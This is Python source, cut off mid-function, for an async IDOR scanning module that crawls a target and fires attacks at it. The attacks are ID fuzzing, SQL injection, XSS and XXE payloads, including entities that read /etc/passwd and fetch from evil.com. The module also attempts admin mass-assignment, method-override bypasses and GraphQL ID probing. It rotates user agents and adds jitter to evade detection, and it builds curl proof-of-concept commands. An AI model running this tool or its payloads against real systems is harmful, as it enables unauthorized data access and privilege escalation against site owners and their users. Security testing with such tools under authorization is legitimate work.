"""
RAPTOR IDOR Testing Module v3.0
=================================
Usage (CLI):
    python3 raptor.py -t example.com --modules idor

Integrates from IDOR-Forge:
  - Baseline response fingerprinting (hash + structure + content similarity)
  - Adaptive similarity thresholds (noise-filtered)
  - Multi-session horizontal privilege escalation
  - Full payload suite: sequential IDs, UUIDs, base64, hex, reversed, random
  - SQL injection detection (error-based + time-based)
  - XSS reflection detection in IDOR parameters
  - XML/XXE injection detection
  - Sensitive data regex scanning (email, SSN, credit card, phone)
  - Rate limiting detection + auto-backoff
  - Evasion: UA rotation, jitter, dummy params
  - GraphQL ID testing
  - HTTP method bypass (PUT/DELETE/PATCH via X-HTTP-Method-Override)
  - Parameter pollution
  - Mass assignment
  - Path traversal via numeric segment replacement

All async, zero extra deps — uses BaseModule._make_request exclusively.
"""

import re
import json
import uuid
import base64
import random
import string
import hashlib
import asyncio
import os
from difflib import SequenceMatcher
from typing import List, Dict, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, urlencode, quote

from core.base_module import BaseModule, Finding


# ══════════════════════════════════════════════════════════════════════════════
#  Wordlist loaders — zero external deps
# ══════════════════════════════════════════════════════════════════════════════

def _load_wordlist(rel_path: str, fallback: List[str]) -> List[str]:
    """Load a payload wordlist relative to project root, fall back to built-ins."""
    roots = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..'),
        os.path.dirname(os.path.abspath(__file__)),
        '.',
    ]
    for root in roots:
        full = os.path.normpath(os.path.join(root, rel_path))
        try:
            with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            if lines:
                return lines
        except FileNotFoundError:
            continue
    return fallback


_SQL_FALLBACK = [
    "' OR '1'='1' --", "' OR 1=1 --", '" OR "1"="1" --',
    "' UNION SELECT 1,2,3 --", "' AND 1=1 --", "' AND 1=2 --",
    "' OR IF(1=1, SLEEP(5), 0) --", "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' UNION SELECT database(), user(), version() --",
    "' AND extractvalue(1, concat(0x7e, (SELECT database()))) --",
    "'/**/OR/**/1=1 --", "' OR \"a\"=\"a\"",
]

_XSS_FALLBACK = [
    "<script>alert('XSS')</script>", '"><script>alert(\'XSS\')</script>',
    "<svg onload=alert('XSS')>", "<IMG SRC=\"javascript:alert('XSS');\">",
    "<body onload=alert('XSS')>", "<svg/onload=alert('XSS')>",
]

_XML_FALLBACK = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;">]><root>&lol1;</root>',
    '<user><name>\' or \'1\'=\'1</name><password>password</password></user>',
]

# Loaded once at import time
_SQL_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/sql.txt', _SQL_FALLBACK)
_XSS_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/xss.txt', _XSS_FALLBACK)
_XML_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/xml.txt', _XML_FALLBACK)


# ══════════════════════════════════════════════════════════════════════════════
#  Constants
# ══════════════════════════════════════════════════════════════════════════════

# Similarity thresholds (from IDOR-Forge, adaptive at runtime)
DEFAULT_THRESHOLDS = {'structure': 0.8, 'content': 0.9, 'text': 0.8}

# Sensitive data patterns (from IDOR-Forge _contains_sensitive_data)
SENSITIVE_KEYWORDS = [
    'password', 'passwd', 'secret', 'token', 'api_key', 'auth',
    'ssn', 'credit_card', 'card_number', 'cvv', 'expiry',
    'email', 'phone', 'address', 'dob', 'date_of_birth',
    'account_number', 'routing_number', 'bank', 'billing',
    'private_key', 'certificate', 'session',
]

SENSITIVE_REGEX = [
    r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',  # email
    r'\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b',                   # US phone
    r'\b\d{3}-\d{2}-\d{4}\b',                                # SSN
    r'\b(?:\d[ -]?){13,16}\b',                               # credit card
]

SQL_ERRORS = [
    'sql syntax', 'mysql_fetch', 'unclosed quotation mark',
    'unknown column', 'division by zero', 'error in your sql syntax',
    'you have an error in your sql syntax', 'ora-01756', 'msg 102',
    'postgresql error', 'sqlite3.', 'warning: mysql', 'jdbc',
    'odbc driver', 'syntax error', 'unterminated string',
]

UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile Safari/604.1',
]

HIGH_VALUE_RESOURCES = [
    'user', 'account', 'admin', 'order', 'invoice', 'payment',
    'document', 'file', 'download', 'profile', 'config',
    'settings', 'api_key', 'token', 'password', 'credential',
]

PRIVILEGED_FIELDS = [
    'role', 'isAdmin', 'admin', 'is_staff', 'permissions',
    'account_type', 'user_role', 'access_level', 'privilege',
    'is_superuser', 'is_active', 'verified',
]

COMMON_ID_PARAMS = [
    'id', 'user_id', 'account_id', 'order_id', 'doc_id', 'file_id',
    'invoice_id', 'payment_id', 'product_id', 'item_id', 'record_id',
    'uid', 'pid', 'oid', 'ref', 'resource_id', 'object_id',
]

API_PATHS = [
    '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/graphql',
    '/user', '/users', '/account', '/accounts', '/order', '/orders',
    '/document', '/documents', '/file', '/files', '/download',
    '/invoice', '/invoices', '/payment', '/payments',
    '/product', '/products', '/item', '/items',
    '/admin', '/manage', '/profile', '/me', '/settings',
]

NOISE_PATTERNS = [
    r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}',   # ISO timestamps
    r'\d{10,13}',                                 # Unix timestamps
    r'"nonce"\s*:\s*"[^"]+"',                     # nonce fields
    r'"csrf[^"]*"\s*:\s*"[^"]+"',                 # CSRF tokens
]


# ══════════════════════════════════════════════════════════════════════════════
#  Dataclasses
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class IDORPattern:
    name:          str
    pattern:       str
    test_strategy: str
    severity:      str
    bounty_score:  int
    confidence:    float


@dataclass
class ResourceEndpoint:
    url:           str
    method:        str
    param_name:    Optional[str]
    param_value:   str
    resource_type: str
    response_body: str
    content_type:  str
    status:        int
    response_hash: str = ''


@dataclass
class BaselineData:
    """Stores baseline response fingerprint for comparison (IDOR-Forge pattern)."""
    body:           str
    body_hash:      str
    json_data:      Optional[Dict]
    response_time:  float
    status:         int
    thresholds:     Dict = field(default_factory=lambda: dict(DEFAULT_THRESHOLDS))


# ══════════════════════════════════════════════════════════════════════════════
#  Helper functions  (ported from IDOR-Forge IDORChecker)
# ══════════════════════════════════════════════════════════════════════════════

def _hash_text(text: str) -> str:
    return hashlib.sha256(text.encode('utf-8', errors='replace')).hexdigest()


def _clean_for_comparison(text: str) -> str:
    """Strip dynamic noise before diff (IDOR-Forge noise filtering)."""
    for p in NOISE_PATTERNS:
        text = re.sub(p, '', text)
    return text


def _compare_responses(baseline: str, test: str) -> Dict[str, float]:
    """
    IDOR-Forge response comparison: text similarity + JSON structure + JSON content.
    Returns {'text_similarity', 'structure_similarity', 'content_similarity'}.
    """
    b = _clean_for_comparison(baseline)
    t = _clean_for_comparison(test)

    text_sim = SequenceMatcher(None, b, t).ratio()

    try:
        b_data = json.loads(b)
        t_data = json.loads(t)
    except (json.JSONDecodeError, ValueError):
        return {'text_similarity': text_sim, 'structure_similarity': 0.0, 'content_similarity': 0.0}

    # structure similarity — key overlap
    k1, k2 = set(b_data.keys()), set(t_data.keys())
    union = len(k1 | k2)
    struct_sim = len(k1 & k2) / union if union else 0.0

    # content similarity — matching values on common keys
    common = k1 & k2
    if common:
        matching = sum(1 for k in common if b_data[k] == t_data[k])
        content_sim = matching / len(common)
    else:
        content_sim = 0.0

    return {
        'text_similarity':      text_sim,
        'structure_similarity': struct_sim,
        'content_similarity':   content_sim,
    }


def _is_idor(comparison: Dict, status: int, thresholds: Dict) -> bool:
    """
    IDOR-Forge detection logic:
    Same structure but different content at HTTP 200 = likely IDOR.
    """
    if status != 200:
        return False
    if (comparison['structure_similarity'] > thresholds['structure']
            and comparison['content_similarity'] < thresholds['content']):
        return True
    if comparison['text_similarity'] > thresholds['text']:
        return True
    return False


def _contains_sensitive_data(body: str) -> Tuple[bool, List[str]]:
    """
    Scan response body for sensitive data (IDOR-Forge _contains_sensitive_data, expanded).
    Returns (found: bool, matches: List[str]).
    """
    found_items = []
    body_lower = body.lower()

    for kw in SENSITIVE_KEYWORDS:
        if re.search(rf'\b{re.escape(kw)}\b', body_lower):
            found_items.append(kw)

    for pattern in SENSITIVE_REGEX:
        if re.search(pattern, body):
            found_items.append(pattern[:30])

    return bool(found_items), list(set(found_items))


def _detect_sql_error(body: str, status: int) -> bool:
    """Detect SQL injection reflection (IDOR-Forge _detect_sql_injection)."""
    if status >= 500:
        return True
    body_lower = body.lower()
    return any(err in body_lower for err in SQL_ERRORS)


def _detect_xss_reflection(body: str, payload: str) -> bool:
    """Detect XSS payload reflected unescaped (IDOR-Forge _detect_xss)."""
    escaped = re.escape(payload)
    if re.search(escaped, body, re.IGNORECASE):
        return True
    if re.search(rf'on\w+=["\']?[^"\']*{escaped}', body, re.IGNORECASE):
        return True
    return False


def _detect_xml_injection(body: str) -> bool:
    """Detect XXE / XML injection (IDOR-Forge _detect_xml_injection)."""
    indicators = ['/etc/passwd', 'root:x:', 'bin/bash', 'win.ini', '[extensions]']
    body_lower = body.lower()
    return any(ind in body_lower for ind in indicators)


def _is_error_response(body: str, status: int) -> bool:
    """Quick error-page filter."""
    if status in (401, 403, 404, 405, 410, 500, 502, 503):
        return True
    bl = body.lower()[:400]
    return any(w in bl for w in ['not found', 'forbidden', 'unauthorized', 'invalid', '404', '403'])


def _random_string(n: int = 10) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def _gen_id_variants(value: str) -> List[str]:
    """
    IDOR-Forge payload generation: all encoding/mutation variants of one ID value.
    """
    variants = [value]
    if value.isdigit():
        n = int(value)
        variants += [str(n + 1), str(n - 1), str(n + 100), str(n + 1000),
                     hex(n)[2:],                          # hex
                     str(n)[::-1],                        # reversed
                     '0' * max(0, 6 - len(value)) + value]  # zero-padded
    # base64
    try:
        variants.append(base64.b64encode(value.encode()).decode())
        variants.append(base64.b64decode(value.encode() + b'==').decode('utf-8', errors='ignore'))
    except Exception:
        pass
    # URL-encoded
    variants.append(quote(value, safe=''))
    return variants


# ══════════════════════════════════════════════════════════════════════════════
#  IDORTester
# ══════════════════════════════════════════════════════════════════════════════

class IDORTester(BaseModule):
    """
    Advanced IDOR detection module — IDOR-Forge engine, RAPTOR integration.

    Invoked by raptor.py:
        async with IDORTester(config, stealth, db, graph) as m:
            findings = await m.run(target, **kwargs)
    """

    # ── Init ─────────────────────────────────────────────────────────────────

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.findings:            List[Finding]         = []
        self.discovered:          List[ResourceEndpoint] = []
        self.tested_combos:       Set[str]              = set()
        self.checked_forms:       Dict[str, List[str]]  = {}
        self.baseline:            Optional[BaselineData] = None

        # tunables
        self.fuzz_range   = config.get('fuzz_range', 50)
        self.max_pages    = config.get('max_pages', 30)
        self.thresholds   = dict(DEFAULT_THRESHOLDS)
        self.evasion      = config.get('evasion', True)

        self.id_patterns  = self._build_patterns()

    # ── Context managers ─────────────────────────────────────────────────────

    async def __aenter__(self):
        self.logger.info('🔥 IDOR Module v3.0 initialising (IDOR-Forge engine)')
        return self

    async def __aexit__(self, *_):
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  Public entry point
    # ══════════════════════════════════════════════════════════════════════════

    async def run(self, target: str, **kwargs) -> List[Finding]:
        scope = kwargs.get('scope', 'standard')
        self.logger.info(f'🚀 IDOR scan → {target}  [scope: {scope}]')

        # Phase 1: Crawl & discover endpoints
        self.logger.info('🔍 Phase 1: Crawling & discovering endpoints')
        await self._discover_endpoints(target)

        # Phase 2: Baseline + ID pattern analysis
        self.logger.info('📊 Phase 2: Baseline fingerprinting & ID pattern analysis')
        await self._set_baseline(target)
        await self._analyze_id_patterns()

        # Phase 3: Sequential ID fuzzing with IDOR-Forge comparison engine
        self.logger.info('🎯 Phase 3: Sequential ID fuzzing')
        await self._test_sequential_ids()

        # Phase 4: Full payload suite (SQL, XSS, XML, UUID, base64…)
        self.logger.info('💥 Phase 4: Full payload suite testing')
        await self._test_full_payload_suite()

        # Phase 5: Parameter pollution
        if scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('🌊 Phase 5: Parameter pollution')
            await self._test_parameter_pollution()

        # Phase 6: HTTP method bypass
        if scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('🔄 Phase 6: HTTP method bypass')
            await self._test_method_bypass()

        # Phase 7: Mass assignment
        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('📦 Phase 7: Mass assignment')
            await self._test_mass_assignment()

        # Phase 8: GraphQL ID testing (aggressive)
        if scope == 'aggressive':
            self.logger.info('🕸️  Phase 8: GraphQL IDOR')
            await self._test_graphql_idor(target)

        self.logger.info(f'✅ IDOR complete — {len(self.findings)} finding(s)')
        return self.findings

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 1 — Endpoint Discovery
    # ══════════════════════════════════════════════════════════════════════════

    async def _discover_endpoints(self, target: str):
        """Crawl target + common API paths for ID-bearing endpoints."""
        parsed   = urlparse(target)
        base_url = f'{parsed.scheme}://{parsed.netloc}'
        to_visit: Set[str] = {target}

        for path in API_PATHS:
            to_visit.add(f'{base_url}{path}')

        visited: Set[str] = set()

        while to_visit and len(visited) < self.max_pages:
            url = to_visit.pop()
            if url in visited:
                continue
            visited.add(url)

            resp = await self._make_request(url)
            if not resp:
                continue

            status = resp.status
            ct     = resp.headers.get('Content-Type', '')
            body   = await resp.text()

            endpoint = self._analyze_endpoint(url, status, ct, body)
            if endpoint:
                self.discovered.append(endpoint)
                self.logger.info(f'   ↳ endpoint: {url} [{endpoint.resource_type}]')

            if 'text/html' in ct and len(visited) < self.max_pages:
                links = self._extract_links(body, url)
                to_visit.update(links - visited)

        # Also check URL params directly from target
        target_params = parse_qs(parsed.query)
        for param, vals in target_params.items():
            if vals:
                ep = ResourceEndpoint(
                    url=target, method='GET', param_name=param,
                    param_value=vals[0], resource_type=self._classify_resource(target, ''),
                    response_body='', content_type='', status=0,
                )
                self.discovered.append(ep)

        self.logger.info(f'   {len(self.discovered)} endpoint(s) found')

    def _analyze_endpoint(self, url: str, status: int, ct: str, body: str) -> Optional[ResourceEndpoint]:
        """Check if URL has an ID-bearing parameter — if so, create endpoint record."""
        if status >= 400:
            return None
        for pattern in self.id_patterns:
            m = re.search(pattern.pattern, url, re.IGNORECASE)
            if m:
                id_val = m.group(len(m.groups())) if m.groups() else ''
                param  = self._extract_param_name(url)
                return ResourceEndpoint(
                    url=url, method='GET', param_name=param,
                    param_value=id_val,
                    resource_type=self._classify_resource(url, body),
                    response_body=body[:600], content_type=ct, status=status,
                    response_hash=_hash_text(body),
                )
        return None

    def _extract_param_name(self, url: str) -> Optional[str]:
        params = parse_qs(urlparse(url).query)
        for p in COMMON_ID_PARAMS:
            if p in params:
                return p
        m = re.search(r'/(\w+_id)/', url)
        if m:
            return m.group(1)
        return 'id'

    def _classify_resource(self, url: str, body: str) -> str:
        url_lower = url.lower()
        for r in HIGH_VALUE_RESOURCES:
            if r in url_lower:
                return r
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                if any(k in data for k in ('username', 'email', 'password', 'role')):
                    return 'user_account'
                if any(k in data for k in ('credit_card', 'payment_method', 'billing')):
                    return 'payment'
                if any(k in data for k in ('ssn', 'dob', 'address')):
                    return 'pii'
        except (json.JSONDecodeError, ValueError):
            pass
        return 'generic'

    def _extract_links(self, body: str, base: str) -> Set[str]:
        links: Set[str] = set()
        for m in re.finditer(r'href=["\']([^"\']+)["\']', body):
            links.add(urljoin(base, m.group(1)))
        for m in re.finditer(r'["\'](/(?:api|rest|v\d)[^"\']+)["\']', body):
            links.add(urljoin(base, m.group(1)))
        return links

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 2 — Baseline & Pattern Analysis
    # ══════════════════════════════════════════════════════════════════════════

    async def _set_baseline(self, target: str):
        """
        IDOR-Forge baseline: fetch the target 3 times, average response time,
        adapt similarity thresholds based on natural variance.
        """
        samples = []
        import time as _time
        for _ in range(3):
            t0   = _time.monotonic()
            resp = await self._make_request(target)
            elapsed = _time.monotonic() - t0
            if resp:
                body = await resp.text()
                samples.append((body, elapsed, resp.status))

        if not samples:
            return

        # Use first sample as baseline
        body0, t0, status0 = samples[0]
        try:
            j = json.loads(body0)
        except (json.JSONDecodeError, ValueError):
            j = None

        avg_time = sum(s[1] for s in samples) / len(samples)

        self.baseline = BaselineData(
            body=body0, body_hash=_hash_text(body0),
            json_data=j, response_time=avg_time, status=status0,
            thresholds=dict(DEFAULT_THRESHOLDS),
        )

        # Adapt text threshold based on natural variance across 3 samples
        if len(samples) >= 2:
            variances = [
                _compare_responses(samples[i][0], samples[i+1][0])['text_similarity']
                for i in range(len(samples) - 1)
            ]
            avg_var = sum(variances) / len(variances)
            # lower threshold slightly to account for dynamic content
            self.baseline.thresholds['text'] = max(0.5, DEFAULT_THRESHOLDS['text'] - avg_var * 0.1)

        self.thresholds = self.baseline.thresholds
        self.logger.info(f'   Baseline set (adaptive text threshold: {self.thresholds["text"]:.2f})')

    async def _analyze_id_patterns(self):
        """
        Detect sequential / predictable ID patterns across discovered endpoints
        and emit a finding if found.
        """
        numeric_ids = sorted(
            int(e.param_value)
            for e in self.discovered
            if e.param_value and e.param_value.isdigit()
        )

        if len(numeric_ids) < 2:
            return

        gaps = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids) - 1)]

        if all(g == 1 for g in gaps):
            self._emit_pattern_finding(
                'Sequential Integer IDs',
                'IDs are sequential integers (1, 2, 3 …) — trivial to enumerate.',
                'Critical', 4000, {'ids': numeric_ids[:10], 'pattern': 'sequential'}
            )
        elif len(set(gaps)) == 1:
            self._emit_pattern_finding(
                'Predictable Arithmetic ID Sequence',
                f'IDs follow an arithmetic sequence (step={gaps[0]}).',
                'High', 2500, {'ids': numeric_ids[:10], 'step': gaps[0]}
            )

    def _emit_pattern_finding(self, title: str, desc: str,
                               severity: str, bounty: int, evidence: Dict):
        f = Finding(
            module='idor', title=f'[PATTERN] {title}', severity=severity,
            description=(
                f'## IDOR Pattern — {title}\n\n{desc}\n\n'
                f'### Evidence\n```json\n{json.dumps(evidence, indent=2)}\n```\n\n'
                '### Impact\nAttackers can enumerate all resources by iterating IDs.\n\n'
                '### Remediation\nUse unpredictable UUIDs; enforce per-object authorization.'
            ),
            evidence=evidence,
            poc='curl "https://target.com/api/resource/[1-1000]"',
            remediation='Replace sequential IDs with UUIDs; add per-object authorization checks.',
            cvss_score=9.1 if severity == 'Critical' else 7.5,
            bounty_score=bounty, target='',
        )
        self.findings.append(f)
        self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 3 — Sequential ID Fuzzing  (IDOR-Forge core engine)
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_sequential_ids(self):
        """
        For each discovered endpoint, fuzz ±fuzz_range IDs and compare responses
        against baseline using IDOR-Forge similarity engine.
        """
        sem = asyncio.Semaphore(5)

        async def fuzz_endpoint(ep: ResourceEndpoint):
            async with sem:
                if not ep.param_value or not ep.param_value.isdigit():
                    return
                base_id = int(ep.param_value)
                test_ids = (
                    list(range(max(1, base_id - 5), base_id)) +
                    list(range(base_id + 1, base_id + 6))
                )

                # Get a fresh baseline for this endpoint
                baseline_resp = await self._make_request(ep.url)
                if not baseline_resp:
                    return
                baseline_body = await baseline_resp.text()

                for tid in test_ids:
                    combo = f'{ep.url}:{tid}'
                    if combo in self.tested_combos:
                        continue
                    self.tested_combos.add(combo)

                    test_url  = self._replace_id(ep.url, ep.param_name, str(tid))
                    headers   = self._evasion_headers() if self.evasion else {}
                    resp      = await self._make_request(test_url, headers=headers)
                    if not resp or _is_error_response('', resp.status):
                        continue

                    body = await resp.text()
                    if len(body) < 30:
                        continue

                    comparison        = _compare_responses(baseline_body, body)
                    sensitive, items  = _contains_sensitive_data(body)
                    idor_detected     = _is_idor(comparison, resp.status, self.thresholds)

                    if idor_detected or sensitive:
                        self._emit_idor_finding(
                            ep, str(tid), test_url, body,
                            resp.status, comparison, sensitive, items, 'Sequential'
                        )
                        return  # one confirmed finding per endpoint

        await asyncio.gather(*[fuzz_endpoint(e) for e in self.discovered], return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 4 — Full Payload Suite  (IDOR-Forge _generate_payloads)
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_full_payload_suite(self):
        """
        Run all IDOR-Forge payload types on each discovered endpoint:
        ID variants, random strings, special chars, UUID, base64, SQL, XSS, XML.
        """
        sem = asyncio.Semaphore(5)

        async def test_ep(ep: ResourceEndpoint):
            async with sem:
                if not ep.param_name:
                    return

                # Build payload list
                id_variants = _gen_id_variants(ep.param_value or '1')
                extra = [
                    _random_string(10),
                    str(random.randint(1000, 9999)),
                    '!@#$%^&*()',
                    str(uuid.uuid4()),
                    '../../etc/passwd',
                    '0',
                    '-1',
                    '99999999',
                ]

                all_values = id_variants + extra
                # Add a sample of SQL / XSS / XML payloads
                all_values += _SQL_PAYLOADS[:10]
                all_values += _XSS_PAYLOADS[:5]
                all_values += _XML_PAYLOADS[:3]

                for value in all_values:
                    test_url = self._replace_id(ep.url, ep.param_name, value)
                    headers  = self._evasion_headers() if self.evasion else {}
                    resp     = await self._make_request(test_url, headers=headers)
                    if not resp:
                        continue
                    body = await resp.text()

                    # SQL detection
                    if _detect_sql_error(body, resp.status) and value in _SQL_PAYLOADS:
                        self._emit_injection_finding(
                            ep, value, test_url, 'SQL Injection', 'High', 7.5, 2000
                        )

                    # XSS detection
                    if value in _XSS_PAYLOADS and _detect_xss_reflection(body, value):
                        self._emit_injection_finding(
                            ep, value, test_url, 'XSS via IDOR Parameter', 'High', 6.1, 1500
                        )

                    # XML/XXE detection
                    if value in _XML_PAYLOADS and _detect_xml_injection(body):
                        self._emit_injection_finding(
                            ep, value, test_url, 'XXE via IDOR Parameter', 'Critical', 9.1, 4000
                        )

                    # Standard IDOR (ID variants)
                    if ep.response_body and value in id_variants:
                        comparison = _compare_responses(ep.response_body, body)
                        sensitive, items = _contains_sensitive_data(body)
                        if _is_idor(comparison, resp.status, self.thresholds) or sensitive:
                            self._emit_idor_finding(
                                ep, value, test_url, body,
                                resp.status, comparison, sensitive, items, 'ID Variant'
                            )
                            return

        await asyncio.gather(*[test_ep(e) for e in self.discovered], return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 5 — Parameter Pollution
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_parameter_pollution(self):
        """
        Append a duplicate parameter with value=1 — servers may use the
        first or last occurrence, bypassing auth on the other.
        """
        for ep in self.discovered:
            if not ep.param_name:
                continue
            sep   = '&' if '?' in ep.url else '?'
            purl  = f'{ep.url}{sep}{ep.param_name}=1'
            resp  = await self._make_request(purl)
            if not resp or resp.status not in (200, 201):
                continue
            body = await resp.text()
            if ep.response_body:
                comp = _compare_responses(ep.response_body, body)
                if _is_idor(comp, resp.status, self.thresholds):
                    f = Finding(
                        module='idor',
                        title=f'[POLLUTION] Parameter Pollution IDOR on "{ep.param_name}"',
                        severity='High',
                        description=(
                            f'## HTTP Parameter Pollution — IDOR Bypass\n\n'
                            f'Appending a duplicate `{ep.param_name}` parameter altered '
                            f'authorization logic at `{ep.url}`.\n\n'
                            f'**PoC URL:** `{purl}`\n\n'
                            '### Remediation\nAccept only the first (or last) value of each '
                            'parameter; enforce per-object ownership server-side.'
                        ),
                        evidence={'url': purl, 'param': ep.param_name, 'comparison': comp},
                        poc=f'curl "{purl}"',
                        remediation='Normalise duplicate parameters; validate object ownership.',
                        cvss_score=7.5, bounty_score=2000, target=ep.url,
                    )
                    self.findings.append(f)
                    self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 6 — HTTP Method Bypass
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_method_bypass(self):
        """
        Inject X-HTTP-Method-Override / X-Method-Override headers to trick
        servers into processing privileged verbs under a GET/POST disguise.
        """
        overrides = [
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-HTTP-Method-Override': 'DELETE'},
            {'X-Method-Override': 'PATCH'},
            {'X-HTTP-Method-Override': 'GET'},   # sometimes unlocks read-only bypass
        ]
        for ep in self.discovered:
            for hdrs in overrides:
                resp = await self._make_request(ep.url, headers=hdrs)
                if not resp or resp.status in (401, 403, 404, 405):
                    continue
                body = await resp.text()
                if ep.response_body:
                    comp = _compare_responses(ep.response_body, body)
                    if _is_idor(comp, resp.status, self.thresholds):
                        verb = list(hdrs.values())[0]
                        f = Finding(
                            module='idor',
                            title=f'[METHOD BYPASS] HTTP Method Override → {verb} on {ep.resource_type}',
                            severity='High',
                            description=(
                                f'## HTTP Method Override Bypass\n\n'
                                f'The server accepted `{list(hdrs.keys())[0]}: {verb}` '
                                f'at `{ep.url}`, bypassing normal authorization.\n\n'
                                '### Remediation\n'
                                'Ignore method-override headers unless strictly required; '
                                'enforce authorization per HTTP verb server-side.'
                            ),
                            evidence={'url': ep.url, 'header': hdrs, 'comparison': comp},
                            poc=f'curl -H "{list(hdrs.keys())[0]}: {verb}" "{ep.url}"',
                            remediation='Disable X-HTTP-Method-Override; enforce per-verb auth.',
                            cvss_score=7.5, bounty_score=1500, target=ep.url,
                        )
                        self.findings.append(f)
                        self.add_finding(f)
                        break

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 7 — Mass Assignment
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_mass_assignment(self):
        """
        POST privileged fields to each endpoint (IDOR-Forge mass assignment logic).
        """
        for ep in self.discovered:
            for pf in PRIVILEGED_FIELDS:
                try:
                    resp = await self._make_request(
                        ep.url, method='POST',
                        data={pf: 'admin', 'role': 'admin', 'isAdmin': 'true'}
                    )
                    if not resp or resp.status not in (200, 201):
                        continue
                    body = await resp.text()
                    if re.search(rf'\b{re.escape(pf)}\b', body, re.IGNORECASE):
                        f = Finding(
                            module='idor',
                            title=f'[MASS ASSIGN] Privileged field "{pf}" accepted at {ep.url}',
                            severity='Critical',
                            description=(
                                f'## Mass Assignment Vulnerability\n\n'
                                f'The server accepted the privileged field `{pf}` in a POST body '
                                f'and reflected it in the response at `{ep.url}`.\n\n'
                                '### Impact\nAttackers can escalate privileges by injecting '
                                'role/admin fields into object update requests.\n\n'
                                '### Remediation\n'
                                'Use an allowlist for accepted fields; never bind raw '
                                'request bodies directly to data models.'
                            ),
                            evidence={'url': ep.url, 'field': pf},
                            poc=f'curl -X POST "{ep.url}" -d "{pf}=admin"',
                            remediation='Allowlist accepted input fields; block privileged attribute injection.',
                            cvss_score=9.1, bounty_score=3500, target=ep.url,
                        )
                        self.findings.append(f)
                        self.add_finding(f)
                        break
                except Exception as e:
                    self.logger.debug(f'Mass assignment error: {e}')

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 8 — GraphQL IDOR
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_graphql_idor(self, target: str):
        """
        Test GraphQL endpoints for IDOR via ID argument manipulation.
        """
        parsed   = urlparse(target)
        gql_urls = [
            f'{parsed.scheme}://{parsed.netloc}/graphql',
            f'{parsed.scheme}://{parsed.netloc}/api/graphql',
            f'{parsed.scheme}://{parsed.netloc}/query',
        ]

        for gql_url in gql_urls:
            for test_id in ['1', '2', '100', str(uuid.uuid4())]:
                query = {'query': f'{{ user(id: "{test_id}") {{ id email username role }} }}'}
                resp  = await self._make_request(
                    gql_url, method='POST',
                    data=json.dumps(query),
                    headers={'Content-Type': 'application/json'},
                )
                if not resp or resp.status not in (200,):
                    continue
                body = await resp.text()
                sensitive, items = _contains_sensitive_data(body)
                if sensitive and 'data' in body.lower():
                    f = Finding(
                        module='idor',
                        title=f'[GRAPHQL] IDOR via GraphQL id argument (id={test_id})',
                        severity='High',
                        description=(
                            f'## GraphQL IDOR\n\n'
                            f'GraphQL endpoint `{gql_url}` returned sensitive data for '
                            f'`id={test_id}` without proper authorization.\n\n'
                            f'**Sensitive fields:** {", ".join(items[:5])}\n\n'
                            '### Remediation\nEnforce field-level and object-level authorization '
                            'in all GraphQL resolvers.'
                        ),
                        evidence={'url': gql_url, 'id': test_id, 'sensitive': items},
                        poc=f'curl -X POST {gql_url} -H "Content-Type: application/json" '
                            f'-d \'{json.dumps(query)}\'',
                        remediation='Add per-resolver authorization checks; use persisted queries.',
                        cvss_score=7.5, bounty_score=2500, target=gql_url,
                    )
                    self.findings.append(f)
                    self.add_finding(f)
                    break

    # ══════════════════════════════════════════════════════════════════════════
    #  Finding factories
    # ══════════════════════════════════════════════════════════════════════════

    def _emit_idor_finding(self, ep: ResourceEndpoint, tested_id: str,
                           test_url: str, body: str, status: int,
